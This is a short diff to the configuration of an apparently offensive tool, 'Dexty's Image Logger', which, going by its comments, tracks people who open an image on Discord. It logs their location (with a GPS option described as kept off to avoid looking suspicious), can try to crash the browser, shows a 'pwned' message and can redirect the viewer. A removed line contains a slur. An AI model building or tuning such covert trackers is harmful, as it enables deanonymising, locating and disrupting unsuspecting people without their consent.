@@ -24,11 +24,11 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "IDK. nagga", # Message to show
+        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": " # Link to the webpage to redirect to 
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
